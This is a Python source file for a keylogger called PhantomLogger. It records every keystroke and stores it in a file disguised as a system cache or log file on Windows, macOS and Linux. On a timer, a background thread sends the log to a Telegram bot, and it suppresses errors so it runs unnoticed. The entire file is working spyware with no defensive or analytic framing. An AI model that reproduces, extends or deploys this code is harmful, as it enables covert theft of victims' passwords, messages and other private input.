from pynput.keyboard import Key, Listener
import platform
import os
import asyncio
import threading
from telegram import Bot
from dotenv import load_dotenv

load_dotenv()


class PhantomLogger:
    def __init__(self):
        self.log_file = self._get_log_path()

        self.bot_token = os.getenv('BOT_TOKEN')
        self.chat_id = os.getenv('CHAT_ID')
        self.send_interval = int(os.getenv('SEND_INTERVAL', 300))
        self.telegram_enabled = bool(self.bot_token and self.chat_id)
    
    def _get_log_path(self):
        system = platform.system()
        
        if system == "Windows":
            return os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Event Viewer', 'ExternalLogs.dat')
            
        elif system == "Darwin":
            return os.path.expanduser('~/Library/Caches/.com.apple.bird.plist')
            
        elif system == "Linux":
            return os.path.expanduser('~/.cache/.fontconfig-timestamp.dat')
    
    def _write_file(self, key_data):
        with open(self.log_file, 'a') as f:
            f.write(f"{key_data} ")
    
    def on_press(self, key):
        try:
            key_data = key.char
        except AttributeError:
            key_data = str(key).replace("Key.", "")
            
        self._write_file(key_data)
    
    async def _send_log_to_telegram(self):
        if not os.path.exists(self.log_file):
            return
        
        try:
            bot = Bot(token=self.bot_token)
            
            with open(self.log_file, 'rb') as file:
                await bot.send_document(
                    chat_id=self.chat_id,
                    document=file,
                    caption=f"Log file - {platform.system()}"
                )
            
        except Exception as e:
            pass 
    
    async def _telegram_scheduler(self):
        while True:
            await asyncio.sleep(self.send_interval)
            await self._send_log_to_telegram()
    
    def _run_telegram_thread(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self._telegram_scheduler())
    
    def phantom_logger_manager(self):
        log_dir = os.path.dirname(self.log_file)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir, exist_ok=True)
        
        if self.telegram_enabled:
            telegram_thread = threading.Thread(
                target=self._run_telegram_thread,
                daemon=True
            )
            telegram_thread.start()
        
        with Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    logger = PhantomLogger()
    logger.phantom_logger_manager()
